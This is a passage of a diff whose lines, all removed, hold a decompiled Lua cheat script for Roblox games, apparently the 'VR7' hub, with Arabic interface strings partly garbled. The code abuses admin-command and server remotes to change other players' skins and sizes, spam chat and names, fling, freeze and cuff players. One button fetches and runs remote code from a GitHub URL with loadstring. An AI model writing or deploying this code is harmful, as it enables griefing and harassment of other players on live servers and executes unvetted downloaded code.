-                                                                    game:GetService("ReplicatedStorage"):WaitForChild("HDAdminHDClient"):WaitForChild("Signals"):WaitForChild("RequestCommandSilent"):InvokeServer(v416 .. "Char me 40")
-                                                                    game:GetService("ReplicatedStorage"):WaitForChild("HDAdminHDClient"):WaitForChild("Signals"):WaitForChild("RequestCommandSilent"):InvokeServer(v416 .. "unchar")
-                                                                end
-                                                            end)
-                                                        end)
-                                                        getgenv().RainbowTjm37.t2.MouseButton1Click:Connect(function()
-                                                            pcall(function()
-                                                                local v417 = GetNearPlayers(game.Players.LocalPlayer, 15)
-                                                                local v418, v419, v420 = pairs(v417)
-                                                                while true do
-                                                                    local v421
-                                                                    v420, v421 = v418(v419, v420)
-                                                                    if v420 == nil then
-                                                                        break
-                                                                    end
-                                                                    task.wait()
-                                                                    local v422 = game:GetService("Players").LocalPlayer.PlayerGui:WaitForChild("HDAdminInterface").MainFrame.Pages.Settings.Custom["AE1 Prefix"].SettingValue.TextBox.Text
-                                                                    game:GetService("ReplicatedStorage"):WaitForChild("HDAdminHDClient"):WaitForChild("Signals"):WaitForChild("RequestCommandSilent"):InvokeServer(v422 .. "Char " .. v421.Name .. " Trifunelo1003")
-                                                                end
-                                                            end)
-                                                        end)
-                                                        getgenv().RainbowTjm50.t2.MouseButton1Click:Connect(function()
-                                                            ChangeToggleColor(getgenv().RainbowTjm50.t2)
-                                                            if getgenv().RainbowTjm50.t2.Ticket_Asset.ImageColor3 == Color3.fromRGB(0, 255, 0) then
-                                                                game:GetService("Players").LocalPlayer.PlayerGui.HDAdminInterface.Notices.Visible = false
-                                                                while getgenv().RainbowTjm50.t2.Ticket_Asset.ImageColor3 == Color3.fromRGB(0, 255, 0) do
-                                                                    task.wait(0.01)
-                                                                    local v423 = game:GetService("Players").LocalPlayer.PlayerGui:WaitForChild("HDAdminInterface").MainFrame.Pages.Settings.Custom["AE1 Prefix"].SettingValue.TextBox.Text
-                                                                    game:GetService("ReplicatedStorage"):WaitForChild("HDAdminHDClient"):WaitForChild("Signals"):WaitForChild("RequestCommandSilent"):InvokeServer(v423 .. "aura random")
-                                                                end
-                                                                game:GetService("Players").LocalPlayer.PlayerGui.HDAdminInterface.Notices.Visible = true
-                                                            end
-                                                        end)
-                                                        getgenv().RainbowTjm51.t2.MouseButton1Click:Connect(function()
-                                                            ChangeToggleColor(getgenv().RainbowTjm51.t2)
-                                                            if getgenv().RainbowTjm51.t2.Ticket_Asset.ImageColor3 == Color3.fromRGB(0, 255, 0) then
-                                                                game:GetService("Players").LocalPlayer.PlayerGui.HDAdminInterface.Notices.Visible = false
-                                                                while getgenv().RainbowTjm51.t2.Ticket_Asset.ImageColor3 == Color3.fromRGB(0, 255, 0) do
-                                                                    task.wait(0.01)
-                                                                    local v424 = game:GetService("Players").LocalPlayer.PlayerGui:WaitForChild("HDAdminInterface").MainFrame.Pages.Settings.Custom["AE1 Prefix"].SettingValue.TextBox.Text
-                                                                    game:GetService("ReplicatedStorage"):WaitForChild("HDAdminHDClient"):WaitForChild("Signals"):WaitForChild("RequestCommandSilent"):InvokeServer(v424 .. "dog random")
-                                                                end
-                                                                game:GetService("Players").LocalPlayer.PlayerGui.HDAdminInterface.Notices.Visible = true
-                                                            end
-                                                        end)
-                                                        getgenv().RainbowTjm41.t2.MouseButton1Click:Connect(function()
-                                                            ChangeToggleColor(getgenv().RainbowTjm41.t2)
-                                                            if getgenv().RainbowTjm41.t2.Ticket_Asset.ImageColor3 == Color3.fromRGB(0, 255, 0) then
-                                                                while getgenv().RainbowTjm41.t2.Ticket_Asset.ImageColor3 == Color3.fromRGB(0, 255, 0) do
-                                                                    if game:GetService("TextChatService").ChatVersion == Enum.ChatVersion.TextChatService then
-                                                                        if game:GetService("TextChatService").ChatVersion == Enum.ChatVersion.TextChatService then
-                                                                            local v425 = 0
-                                                                            repeat
-                                                                                task.wait(0.3)
-                                                                                v425 = v425 + 1
-                                                                                Send("\239\191\189\216\167\217\138\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r.")
-                                                                            until v425 >= 8
-                                                                        end
-                                                                        task.wait(0.5)
-                                                                    end
-                                                                end
-                                                            end
-                                                        end)
-                                                        getgenv().RainbowTjm40.t2.MouseButton1Click:Connect(function()
-                                                            pcall(function()
-                                                                local v426 = game:GetService("Players").LocalPlayer.PlayerGui:WaitForChild("HDAdminInterface").MainFrame.Pages.Settings.Custom["AE1 Prefix"].SettingValue.TextBox.Text
-                                                                game:GetService("ReplicatedStorage"):WaitForChild("HDAdminHDClient"):WaitForChild("Signals"):WaitForChild("RequestCommandSilent"):InvokeServer(v426 .. "Char me Trifunelo1003")
-                                                            end)
-                                                        end)
-                                                        getgenv().RainbowTjm38.t2.MouseButton1Click:Connect(function()
-                                                            pcall(function()
-                                                                local v427 = GetNearPlayers(game.Players.LocalPlayer, 15)
-                                                                local v428, v429, v430 = pairs(v427)
-                                                                while true do
-                                                                    local v431
-                                                                    v430, v431 = v428(v429, v430)
-                                                                    if v430 == nil then
-                                                                        break
-                                                                    end
-                                                                    task.wait()
-                                                                    local v432 = game:GetService("Players").LocalPlayer.PlayerGui:WaitForChild("HDAdminInterface").MainFrame.Pages.Settings.Custom["AE1 Prefix"].SettingValue.TextBox.Text
-                                                                    game:GetService("ReplicatedStorage"):WaitForChild("HDAdminHDClient"):WaitForChild("Signals"):WaitForChild("RequestCommandSilent"):InvokeServer(v432 .. "Size " .. v431.Name .. " 3")
-                                                                end
-                                                            end)
-                                                        end)
-                                                        getgenv().RainbowTjm39.t2.MouseButton1Click:Connect(function()
-                                                            ChangeToggleColor(getgenv().RainbowTjm39.t2)
-                                                            if getgenv().RainbowTjm39.t2.Ticket_Asset.ImageColor3 ~= Color3.fromRGB(0, 255, 0) then
-                                                                wait(0.1)
-                                                                game.Players.LocalPlayer.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated, true)
-                                                                game.Players.LocalPlayer.Character.Humanoid.Sit = false
-                                                            else
-                                                                while getgenv().RainbowTjm39.t2.Ticket_Asset.ImageColor3 == Color3.fromRGB(0, 255, 0) do
-                                                                    wait()
-                                                                    pcall(function()
-                                                                        game.Players.LocalPlayer.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated, false)
-                                                                        game.Players.LocalPlayer.Character.Humanoid.Sit = false
-                                                                        game.Players.LocalPlayer.Character.Humanoid.Sit = true
-                                                                    end)
-                                                                end
-                                                            end
-                                                        end)
-                                                        LoadChatAlert()
-                                                    end
-                                                else
-                                                    SendNotify("\239\191\189\217\132\216\167\216\173\216\184\216\169", "\239\191\189\216\176\216\167 \216\167\217\132\217\133\216\167\216\168 \217\133\216\175\216\185\217\136\217\133 \217\133\217\134 \216\167\217\132\216\179\217\131\216\177\216\168\216\170 \216\170\217\136\216\172\216\175 \217\133\217\138\216\178\216\167\216\170 \216\174\216\167\216\181\217\135 \216\168\217\132\217\133\216\167\216\168", 5)
-                                                    getgenv().RainbowTjm3 = CreateButtonWithText(vu232, "StreetSoccer", "\239\191\189\217\131\216\177\216\168\216\170 \217\131\217\136\216\177\216\169", UDim2.new(0, 25, 0, 225), "TPS:Street Soccer", 0)
-                                                    getgenv().RainbowTjm3.t2.MouseButton1Click:Connect(function()
-                                                        loadstring(game:HttpGet("https://raw.githubusercontent.com/Hm5011/hussain/refs/heads/main/Tps%3A%20Street%20Soccer"))()
-                                                        VR7:Destroy()
-                                                    end)
-                                                    LoadChatAlert()
-                                                end
-                                            else
-                                                getgenv().RainbowTjm31 = CreateButtonWithText(vu232, "Spam_Skins", "\239\191\189\216\173\216\168 \217\131\217\134\217\136\216\178 \217\130\216\177\217\138\216\168\217\135", UDim2.new(0, 25, 0, 225), "\239\191\189\216\167\216\168 \216\167\217\132\217\131\216\180\216\170\217\135", 0)
-                                                getgenv().RainbowTjm31.t2.MouseButton1Click:Connect(function()
-                                                    ChangeToggleColor(getgenv().RainbowTjm31.t2)
-                                                    if getgenv().RainbowTjm31.t2.Ticket_Asset.ImageColor3 == Color3.fromRGB(0, 255, 0) then
-                                                        while getgenv().RainbowTjm31.t2.Ticket_Asset.ImageColor3 == Color3.fromRGB(0, 255, 0) and wait(0.2) do
-                                                            local v433, v434, v435 = ipairs(workspace.K_Z:GetChildren())
-                                                            while true do
-                                                                local v436
-                                                                v435, v436 = v433(v434, v435)
-                                                                if v435 == nil then
-                                                                    break
-                                                                end
-                                                                if v436.Transparency == 0 and v436:FindFirstChild("ClickDetector") then
-                                                                    fireclickdetector(v436.ClickDetector)
-                                                                end
-                                                            end
-                                                        end
-                                                    end
-                                                end)
-                                                LoadChatAlert()
-                                            end
-                                        else
-                                            SendNotify("\239\191\189\217\132\216\167\216\173\216\184\216\169", "\239\191\189\216\176\216\167 \216\167\217\132\217\133\216\167\216\168 \217\133\216\175\216\185\217\136\217\133 \217\133\217\134 \216\167\217\132\216\179\217\131\216\177\216\168\216\170 \216\170\217\136\216\172\216\175 \217\133\217\138\216\178\216\167\216\170 \216\174\216\167\216\181\217\135 \216\168\217\132\217\133\216\167\216\168", 5)
-                                            getgenv().RainbowTjm31 = CreateButtonWithText(v260, "Bring_People", "\239\191\189\216\173\216\168", UDim2.new(0, 210, 0, 400), "\239\191\189\216\167\216\168 \216\167\217\132\216\168\217\138\217\136\216\170", 0)
-                                            getgenv().RainbowTjm32 = CreateButtonWithText(v260, "Bring_People", "\239\191\189\216\170\217\132", UDim2.new(0, 25, 0, 450), "\239\191\189\216\167\216\168 \216\167\217\132\216\168\217\138\217\136\216\170", 0)
-                                            getgenv().RainbowTjm33 = CreateButtonWithText(vu232, "Spam_Skins", "\239\191\189\216\168\216\167\217\133 \216\167\216\179\217\133\216\167\216\161", UDim2.new(0, 25, 0, 225), "\239\191\189\216\167\216\168 \216\167\217\132\216\168\217\138\217\136\216\170", 0)
-                                            v260.CanvasSize = UDim2.new(0, 0, 1.5, 0)
-                                            getgenv().RainbowTjm31.t2.MouseButton1Click:Connect(function()
-                                                if vu41 ~= nil then
-                                                    BrookBring(vu41, true)
-                                                end
-                                            end)
-                                            getgenv().RainbowTjm32.t2.MouseButton1Click:Connect(function()
-                                                if vu41 ~= nil then
-                                                    BrookBring(vu41, false)
-                                                end
-                                            end)
-                                            getgenv().RainbowTjm33.t2.MouseButton1Click:Connect(function()
-                                                ChangeToggleColor(getgenv().RainbowTjm33.t2)
-                                                if getgenv().RainbowTjm33.t2.Ticket_Asset.ImageColor3 == Color3.fromRGB(0, 255, 0) then
-                                                    local v437 = {
-                                                        "\239\191\189\216\180\217\130\217\131",
-                                                        "\239\191\189\217\132\217\138 \217\130\216\175\216\167\217\133\217\138 \217\136\216\181\216\174",
-                                                        "\239\191\189\217\135\217\138\217\134\217\131",
-                                                        "\239\191\189\217\130\216\178 \216\168\216\179",
-                                                        "\239\191\189\217\134\216\167 \216\185\217\133\217\131",
-                                                        "\239\191\189\216\177\217\131\216\168\217\131",
-                                                        "\239\191\189\217\138\216\167\217\131\217\131\217\133",
-                                                        "\239\191\189\216\167\216\172 \216\177\216\167\216\179\217\131",
-                                                        "\239\191\189\217\134\216\185\216\167\217\132\217\138 \216\167\216\168\217\136\217\131",
-                                                        "\239\191\189\217\131\216\167\217\129\216\173\216\169 \216\167\217\132\216\177\217\136\217\132",
-                                                        "\239\191\189\216\167\216\186\216\183\217\135\217\133\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189",
-                                                        "\239\191\189\216\174\216\177\217\138\216\168 \216\185\217\132\217\137 \216\167\217\132\216\177\217\136\217\132",
-                                                        "\239\191\189\217\134\216\185\216\167\217\132\217\138 \216\181\216\167\216\173\216\168 \216\167\217\132\217\133\216\167\216\168 \217\136\217\133\216\180\216\177\217\129\217\138\217\134\217\135",
-                                                        "\239\191\189\216\172\217\132\217\138 \217\129\217\138\217\131",
-                                                        "\239\191\189\217\132\216\167 \216\167\217\134\216\168\216\173",
-                                                        "\239\191\189\217\132\217\138\217\131 \217\133\216\182\216\186\217\136\216\183 \217\133\217\134\217\138",
-                                                        "\239\191\189\216\178 \216\167\217\133\217\135\216\167 \216\168\216\179",
-                                                        "\239\191\189\217\132\217\138 \217\130\216\175\216\167\217\133\217\138 \217\131\217\132\216\168",
-                                                        "\239\191\189\217\134\216\185\216\167\217\132\217\138 \217\131\217\132 \216\167\217\132\217\138 \216\182\216\167\216\186\216\183\217\135\217\133 \226\156\140\239\184\143",
-                                                        "\239\191\189\217\134\216\167 \217\129\216\173\217\132 \216\167\217\132\217\133\216\167\216\168",
-                                                        "\239\191\189\217\134\216\168\216\185 \216\167\217\132\217\133\216\177\216\172\217\132\217\135 \217\135\217\134\216\167"
-                                                    }
-                                                    local v438 = 0
-                                                    while getgenv().RainbowTjm33.t2.Ticket_Asset.ImageColor3 == Color3.fromRGB(0, 255, 0) and task.wait(0.3) do
-                                                        local v439 = v437[math.random(1, # v437)]
-                                                        game:GetService("ReplicatedStorage"):WaitForChild("RE"):WaitForChild("1RPNam1eTex1t"):FireServer("RolePlayName", v439)
-                                                        v438 = v438 + 1
-                                                        if v438 >= 5 then
-                                                            game:GetService("ReplicatedStorage"):WaitForChild("RE"):WaitForChild("1RPNam1eColo1r"):FireServer("PickingRPNameColor", Color3.new(math.random(0, 1), math.random(0, 1), math.random(0, 1)))
-                                                            v438 = 0
-                                                        end
-                                                    end
-                                                end
-                                            end)
-                                            LoadChatAlert()
-                                        end
-                                    else
-                                        SendNotify("\239\191\189\217\132\216\167\216\173\216\184\216\169", "\239\191\189\216\176\216\167 \216\167\217\132\217\133\216\167\216\168 \217\133\216\175\216\185\217\136\217\133 \217\133\217\134 \216\167\217\132\216\179\217\131\216\177\216\168\216\170 \216\170\217\136\216\172\216\175 \217\133\217\138\216\178\216\167\216\170 \216\174\216\167\216\181\217\135 \216\168\217\132\217\133\216\167\216\168", 5)
-                                        getgenv().RainbowTjm3 = CreateButtonWithText(vu232, "Ball_Fling", "\239\191\189\217\132\217\134\217\130 \217\131\217\136\216\177\216\169", UDim2.new(0, 25, 0, 225), "\239\191\189\216\175\217\133\217\134 \216\167\217\136\217\132\216\167\216\175 \217\136\216\168\217\134\216\167\216\170", 0)
-                                        getgenv().RainbowTjm3.t2.MouseButton1Click:Connect(function()
-                                            ChangeToggleColor(getgenv().RainbowTjm3.t2)
-                                            if getgenv().RainbowTjm3.t2.Ticket_Asset.ImageColor3 ~= Color3.fromRGB(0, 255, 0) then
-                                                getgenv().loopfling = false
-                                            else
-                                                getgenv().loopfling = true
-                                                if not getgenv().working then
-                                                    if workspace:FindFirstChild("Ball", true) then
-                                                        SendNotify("\239\191\189\217\132\216\167\216\173\216\184\216\169", "\239\191\189\216\176\216\167 \216\167\216\174\216\170\217\129\216\170 \216\167\217\132\217\131\217\136\216\177\216\169 \216\179\217\136\217\129 \216\170\216\172\216\175\217\135\216\167 \217\129\217\138 \216\167\217\132\217\133\217\132\216\185\216\168", 5)
-                                                        Flinger(workspace["Mini Football stadium"].Ball)
-                                                    else
-                                                        SendNotify("\239\191\189\216\183\216\167", "\239\191\189\216\176\216\177\216\167 \217\132\216\167\217\138\217\136\216\172\216\175 \217\131\217\136\216\177\216\169 \217\129\217\138 \216\167\217\132\216\179\217\138\216\177\217\129\216\177 \217\138\216\177\216\172\217\137 \216\170\216\186\217\138\217\138\216\177 \216\167\217\132\216\179\217\138\216\177\217\129\216\177", 5)
-                                                    end
-                                                end
-                                            end
-                                        end)
-                                        LoadChatAlert()
-                                    end
-                                else
-                                    SendNotify("\239\191\189\217\132\216\167\216\173\216\184\216\169", "\239\191\189\216\176\216\167 \216\167\217\132\217\133\216\167\216\168 \217\133\216\175\216\185\217\136\217\133 \217\133\217\134 \216\167\217\132\216\179\217\131\216\177\216\168\216\170 \216\170\217\136\216\172\216\175 \217\133\217\138\216\178\216\167\216\170 \216\174\216\167\216\181\217\135 \216\168\217\132\217\133\216\167\216\168", 5)
-                                    getgenv().RainbowTjm3 = CreateButtonWithText(vu232, "Ball_Fling", "\239\191\189\217\132\217\134\217\130 \217\131\217\136\216\177\216\169", UDim2.new(0, 25, 0, 225), "\239\191\189\216\175\217\133\217\134 \216\167\217\136\217\132\216\167\216\175 \217\136\216\168\217\134\216\167\216\170", 0)
-                                    getgenv().RainbowTjm3.t2.MouseButton1Click:Connect(function()
-                                        ChangeToggleColor(getgenv().RainbowTjm3.t2)
-                                        if getgenv().RainbowTjm3.t2.Ticket_Asset.ImageColor3 ~= Color3.fromRGB(0, 255, 0) then
-                                            getgenv().loopfling = false
-                                        else
-                                            getgenv().loopfling = true
-                                            if not getgenv().working then
-                                                if workspace:FindFirstChild("Ball", true) then
-                                                    SendNotify("\239\191\189\217\132\216\167\216\173\216\184\216\169", "\239\191\189\216\176\216\167 \216\167\216\174\216\170\217\129\216\170 \216\167\217\132\217\131\217\136\216\177\216\169 \216\179\217\136\217\129 \216\170\216\172\216\175\217\135\216\167 \217\129\217\138 \216\167\217\132\217\133\217\132\216\185\216\168", 5)
-                                                    Flinger(workspace:FindFirstChild("Ball", true))
-                                                else
-                                                    SendNotify("\239\191\189\216\183\216\167", "\239\191\189\216\176\216\177\216\167 \217\132\216\167\217\138\217\136\216\172\216\175 \217\131\217\136\216\177\216\169 \217\129\217\138 \216\167\217\132\216\179\217\138\216\177\217\129\216\177 \217\138\216\177\216\172\217\137 \216\170\216\186\217\138\217\138\216\177 \216\167\217\132\216\179\217\138\216\177\217\129\216\177", 5)
-                                                end
-                                            end
-                                        end
-                                    end)
-                                    LoadChatAlert()
-                                end
-                            else
-                                SendNotify("\239\191\189\217\132\216\167\216\173\216\184\216\169", "\239\191\189\216\176\216\167 \216\167\217\132\217\133\216\167\216\168 \217\133\216\175\216\185\217\136\217\133 \217\133\217\134 \216\167\217\132\216\179\217\131\216\177\216\168\216\170 \216\170\217\136\216\172\216\175 \217\133\217\138\216\178\216\167\216\170 \216\174\216\167\216\181\217\135 \216\168\217\132\217\133\216\167\216\168", 5)
-                                getgenv().RainbowTjm3 = CreateButtonWithText(vu232, "Spam_Skins", "\239\191\189\216\168\216\167\217\133 \216\179\217\131\217\134\216\167\216\170", UDim2.new(0, 25, 0, 225), "\239\191\189\216\167\217\132\217\138\216\169 \216\177\217\136\216\168", 0)
-                                getgenv().RainbowTjm31 = CreateButtonWithText(vu232, "Spam_Skins", "\239\191\189\216\168\216\167\217\133 \216\167\216\179\217\133\216\167\216\161", UDim2.new(0, 210, 0, 225), "\239\191\189\216\167\217\132\217\138\216\169 \216\177\217\136\216\168", 0)
-                                getgenv().RainbowTjm33 = CreateButtonWithText(vu232, "Spam_Skins", "\239\191\189\217\133\217\138 \216\167\217\132\217\134\216\167\216\179", UDim2.new(0, 210, 0, 275), "\239\191\189\216\173\216\170\216\167\216\172 \217\131\217\132\216\168\216\180\216\169", 0)
-                                getgenv().RainbowTjm34 = CreateButtonWithText(vu232, "Spam_Skins", "\239\191\189\216\173\216\168 \216\167\217\132\217\134\216\167\216\179", UDim2.new(0, 25, 0, 275), "\239\191\189\216\173\216\170\216\167\216\172 \217\131\217\132\216\168\216\180\216\169", 0)
-                                getgenv().RainbowTjm35 = CreateButtonWithText(v260, "Bring_People", "\239\191\189\216\173\216\168", UDim2.new(0, 25, 0, 450), "\239\191\189\216\167\217\132\217\138\216\169 \216\177\217\136\216\168", 0)
-                                getgenv().RainbowTjm41 = CreateButtonWithText(vu232, "Spam_Skins", "\239\191\189\216\174\216\177\217\138\216\168 \216\167\217\132\216\180\216\167\216\170", UDim2.new(0, 210, 0, 375), "\239\191\189\216\167\217\132\217\138\216\169 \216\177\217\136\216\168", 0)
-                                getgenv().RainbowTjm36 = CreateButtonWithText(v260, "Freeze_People", "\239\191\189\216\172\217\133\217\138\216\175", UDim2.new(0, 210, 0, 450), "\239\191\189\216\167\217\132\217\138\216\169 \216\177\217\136\216\168", 0)
-                                getgenv().RainbowTjm37 = CreateButtonWithText(vu232, "Change_Skins", "\239\191\189\216\186\217\138\217\138\216\177 \216\179\217\131\217\134\216\167\216\170 \216\167\217\132\217\130\216\177\217\138\216\168\217\138\217\134", UDim2.new(0, 25, 0, 375), "\239\191\189\216\173\216\170\216\167\216\172 \216\167\216\175\217\133\217\134", 0)
-                                getgenv().RainbowTjm38 = CreateButtonWithText(vu232, "Change_Size", "\239\191\189\217\131\216\168\217\138\216\177 \216\167\217\132\217\130\216\177\217\138\216\168\217\138\217\134", UDim2.new(0, 25, 0, 325), "\239\191\189\216\173\216\170\216\167\216\172 \216\167\216\175\217\133\217\134", 0)
-                                getgenv().RainbowTjm40 = CreateButtonWithText(vu232, "Sound_Skin", "\239\191\189\217\131\217\134 \217\138\216\183\217\132\216\185 \216\181\217\136\216\170", UDim2.new(0, 210, 0, 325), "\239\191\189\216\167\217\132\217\138\216\169 \216\177\217\136\216\168", 0)
-                                v260.CanvasSize = UDim2.new(0, 0, 1.5, 0)
-                                vu232.CanvasSize = UDim2.new(0, 0, 1.2, 0)
-                                getgenv().RainbowTjm3.t2.MouseButton1Click:Connect(function()
-                                    ChangeToggleColor(getgenv().RainbowTjm3.t2)
-                                    if getgenv().RainbowTjm3.t2.Ticket_Asset.ImageColor3 ~= Color3.fromRGB(0, 255, 0) then
-                                        getgenv().loopSkins = false
-                                    else
-                                        getgenv().loopSkins = true
-                                        local v440 = {3698980491,2482733262,4869908886,4829727233,3924330309,4963378099,5749595748,2486880286,5121802170,5571034904,2534925226,1908093843,1695074412,1001234444,2738295433,5007493214,3536612888,1924926487,5496525496,2734003720,535060401,3438246078,1503840840,1758848324,2494484367,1650713618,2038507143,1908533564,4981871124,3073976304,5867473710,1916876322,2460301218,475746173,3639544277,3395753168,3808354214,2318056116,7209132441,35755428,66756597,2679721697,2050045875,2519670708,4235194382,3370593985,3620080414,2326191112,4956722605,1909916296,3314864649,2769746902,3704061128,3420661127,4699448973,4367063405,2758912697,2466468896,4734115317,2958617249,4834192573,5801021621,5626658182,4132839307,3218124495,4913090478,2452744987,2717570627,2479596912,4434189877,5411206081,3336172524,3335431880,2972884772,2771050226,3104193443,5232644719,4523866249,2619852340,3620729767,4803684054,5788731598,5357265092,2492437352,3017468200,4306262070,5868233200,4651664513,2955607544,1737946288,4451747675,3776677463,4502110305,5592637934,4591920267,5535903380,2266109788,4464471813,2600387006,2293539872,5479968451,3779259507,4020790582,3382742043,1991672777,5490972740,4367063405,2269923272,5713102512,2439951362,5750361112,1961352360,2546737188,1965234677,6232896470,5556309052,1945827451,2266109788,2220018722,2457573632,3250313747,4102506593,4800228003,5065586685,3219301469,5750361112,4758186111,5761622248,6156494691,4126309364,1548625484,2550030807,5434878393,5301581025,3104193443,5704844718,3620729767,1857997074,2519711707,5720381635,2204027528,3276420293,3643204820,3247414642,2209338035,3620729767,5092277391,3747668036,4338261710,5769829905,2512573032,4522837151,2428159367,5623922812,5516227749,4061510807,4016126804,2619852340,5828073482,5623922812,4625752819}
-                                        while getgenv().loopSkins and task.wait() do
-                                            local v441, v442, v443 = ipairs(v440)
-                                            local v444 = 0
-                                            while true do
-                                                local v445
-                                                v443, v445 = v441(v442, v443)
-                                                if v443 == nil or not getgenv().loopSkins then
-                                                    break
-                                                end
-                                                task.wait(0.2)
-                                                v444 = v444 + 1
-                                                if v444 >= 25 then
-                                                    game.ReplicatedStorage.PrivateCommands.Char:FireServer(1681347188)
-                                                    wait(2.5)
-                                                    if not getgenv().loopSkins then
-                                                        break
-                                                    end
-                                                    v444 = 0
-                                                end
-                                                game.ReplicatedStorage.PrivateCommands.Char:FireServer(v445)
-                                            end
-                                        end
-                                    end
-                                end)
-                                getgenv().RainbowTjm31.t2.MouseButton1Click:Connect(function()
-                                    if vu48 then
-                                        ChangeToggleColor(getgenv().RainbowTjm31.t2)
-                                        local v446 = game:GetService("Players").LocalPlayer.PlayerGui.ScreenGui.Title.ChangeName
-                                        local v447 = game:GetService("Players").LocalPlayer.PlayerGui.ScreenGui.Title.Input
-                                        local v448 = {
-                                            "\239\191\189\217\132\217\138 \217\130\216\175\216\167\217\133\217\138 \217\136\216\181\216\174",
-                                            "\239\191\189\217\134\216\167 \216\185\217\133\217\131",
-                                            "\239\191\189\216\167\216\172 \216\177\216\167\216\179\217\131",
-                                            "\239\191\189\217\134\216\185\216\167\217\132\217\138 \216\180\216\167\217\132\217\138\216\169 \216\177\217\136\216\168",
-                                            "\239\191\189\217\131\216\167\217\129\216\173\216\169 \216\167\217\132\216\177\217\136\217\132",
-                                            "\239\191\189\216\167\216\186\216\183\217\135\217\133\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189",
-                                            "\239\191\189\216\174\216\177\217\138\216\168 \216\185\217\132\217\137 \216\167\217\132\216\177\217\136\217\132",
-                                            "\239\191\189\217\134\216\185\216\167\217\132\217\138 \216\181\216\167\216\173\216\168 \216\167\217\132\217\133\216\167\216\168 \217\136\217\133\216\180\216\177\217\129\217\138\217\134\217\135",
-                                            "\239\191\189\217\129\216\182\217\132 \217\135\216\167\217\131 \216\167\217\138\217\129\217\136\217\134 \216\167\216\174\216\170\216\181\216\167\216\177\217\135 \216\175\216\179\217\131\217\136\216\177\216\175 vr7",
-                                            "\239\191\189\216\172\217\132\217\138 \217\129\217\138\217\131",
-                                            "\239\191\189\217\132\216\167 \216\167\217\134\216\168\216\173",
-                                            "\239\191\189\217\132\217\138\217\131 \217\133\216\182\216\186\217\136\216\183 \217\133\217\134\217\138",
-                                            "\239\191\189\216\178 \216\167\217\133\217\135\216\167 \216\168\216\179",
-                                            "\239\191\189\217\132\217\138 \217\130\216\175\216\167\217\133\217\138 \217\131\217\132\216\168",
-                                            "\239\191\189\217\134\216\185\216\167\217\132\217\138 \217\131\217\132 \216\167\217\132\217\138 \216\182\216\167\216\186\216\183\217\135\217\133 \226\156\140\239\184\143",
-                                            "VR7 \216\185\217\133\217\131",
-                                            "\239\191\189\217\134\216\167 \217\129\216\173\217\132 \216\167\217\132\217\133\216\167\216\168",
-                                            "\239\191\189\217\134\216\168\216\185 \216\167\217\132\217\133\216\177\216\172\217\132\217\135 \217\135\217\134\216\167"
-                                        }
-                                        while getgenv().RainbowTjm31.t2.Ticket_Asset.ImageColor3 == Color3.fromRGB(0, 255, 0) and task.wait(5) do
-                                            local v449 = v448[math.random(1, # v448)]
-                                            local v450 = math.random(1, # game:GetService("Players").LocalPlayer.PlayerGui.ScreenGui.Title.Colors:GetChildren())
-                                            v447.Text = v449
-                                            local v451, v452, v453 = ipairs(game:GetService("Players").LocalPlayer.PlayerGui.ScreenGui.Title.Colors:GetChildren())
-                                            while true do
-                                                local v454
-                                                v453, v454 = v451(v452, v453)
-                                                if v453 == nil then
-                                                    break
-                                                end
-                                                if v453 == v450 and v454:IsA("Frame") then
-                                                    firesignal(v454.hit_box.MouseButton1Click)
-                                                    break
-                                                end
-                                            end
-                                            firesignal(v446.MouseButton1Click)
-                                            if game:GetService("Players").LocalPlayer.PlayerGui.ScreenGui.HiddenCommands.Visible then
-                                                game:GetService("Players").LocalPlayer.PlayerGui.ScreenGui.HiddenCommands.Visible = false
-                                            end
-                                        end
-                                    else
-                                        SendNotify("System VR7", "\239\191\189\217\132\216\167\216\179\217\129 \216\167\217\132\217\135\216\167\217\131 \216\167\217\132\217\138 \216\170\216\179\216\170\216\174\216\175\217\133\216\169 \217\132\216\167\217\138\216\175\216\185\217\133 \217\135\217\132 \217\133\217\138\216\178\216\169", 5)
-                                    end
-                                end)
-                                getgenv().RainbowTjm33.t2.MouseButton1Click:Connect(function()
-                                    if GetCuff() then
-                                        ChangeToggleColor(getgenv().RainbowTjm33.t2)
-                                        if getgenv().RainbowTjm33.t2.Ticket_Asset.ImageColor3 ~= Color3.fromRGB(0, 255, 0) then
-                                            getgenv().Cuff = {
-                                                Bring = false,
-                                                Throw = false
-                                            }
-                                        else
-                                            if getgenv().RainbowTjm34.t2.Ticket_Asset.ImageColor3 == Color3.fromRGB(0, 255, 0) then
-                                                getgenv().RainbowTjm34.t2.Ticket_Asset.ImageColor3 = Color3.fromRGB(255, 0, 0)
-                                                getgenv().Cuff = {
-                                                    Bring = false,
-                                                    Throw = false
-                                                }
-                                                wait(1)
-                                            end
-                                            getgenv().Cuff = {
-                                                Bring = true,
-                                                Throw = true
-                                            }
-                                            Cuffbring()
-                                        end
-                                    else
-                                        game:GetService("StarterGui"):SetCore("SendNotification", {
-                                            Title = "System VR7",
-                                            Text = "\239\191\189\216\167\216\178\217\133 \217\138\217\131\217\136\217\134 \217\133\216\185\217\131 \217\131\217\132\216\168\216\180\216\169",
-                                            Duration = 5
-                                        })
-                                    end
-                                end)
-                                getgenv().RainbowTjm34.t2.MouseButton1Click:Connect(function()
-                                    if GetCuff() then
-                                        ChangeToggleColor(getgenv().RainbowTjm34.t2)
-                                        if getgenv().RainbowTjm34.t2.Ticket_Asset.ImageColor3 ~= Color3.fromRGB(0, 255, 0) then
-                                            getgenv().Cuff = {
-                                                Bring = false,
-                                                Throw = false
-                                            }
-                                        else
-                                            if getgenv().RainbowTjm33.t2.Ticket_Asset.ImageColor3 == Color3.fromRGB(0, 255, 0) then
